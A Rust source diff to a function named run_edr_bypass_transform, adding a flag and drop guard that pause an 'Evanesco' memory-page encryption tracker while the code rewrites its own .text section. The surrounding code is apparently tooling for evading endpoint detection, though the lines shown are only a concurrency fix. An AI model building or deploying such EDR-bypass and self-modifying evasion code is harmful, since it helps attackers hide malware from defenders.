@@ -1187,6 +1187,26 @@ pub fn run_edr_bypass_transform(
 ) -> Result<TransformCycleResult> {
     let start = std::time::Instant::now();
 
+    // MED-009: Set coordination flag so Evanesco page_tracker defers
+    // encryption while we modify .text.  Must be set BEFORE freeze_threads()
+    // so the background thread sees it on its next iteration.
+    #[cfg(all(windows, feature = "evanesco"))]
+    crate::page_tracker::set_transform_in_progress(true);
+
+    // MED-009: Guard to clear the coordination flag on early return (error).
+    // The flag is also explicitly cleared after thaw() on the happy path,
+    // but this guard ensures it's cleared if we bail before reaching thaw().
+    #[cfg(all(windows, feature = "evanesco"))]
+    struct TransformFlagGuard;
+    #[cfg(all(windows, feature = "evanesco"))]
+    impl Drop for TransformFlagGuard {
+        fn drop(&mut self) {
+            crate::page_tracker::set_transform_in_progress(false);
+        }
+    }
+    #[cfg(all(windows, feature = "evanesco"))]
+    let _flag_guard = TransformFlagGuard;
+
     // P1-03: Suspend all sibling threads before touching .text to avoid
     // race conditions where another thread executes partially-written code.
     // The FrozenThreads guard auto-resumes on Drop (panic-safe).
@@ -1433,6 +1453,12 @@ pub fn run_edr_bypass_transform(
     // The FrozenThreads Drop guard would also do this, but explicit thaw
     // ensures threads resume *after* the cache flush.
     frozen.thaw();
+
+    // MED-009: Clear coordination flag so Evanesco page_tracker resumes
+    // normal encryption.  Must be cleared AFTER thaw so the background
+    // thread doesn't start encrypting before threads are fully resumed.
+    #[cfg(all(windows, feature = "evanesco"))]
+    crate::page_tracker::set_transform_in_progress(false);
 
     let elapsed = start.elapsed();
 
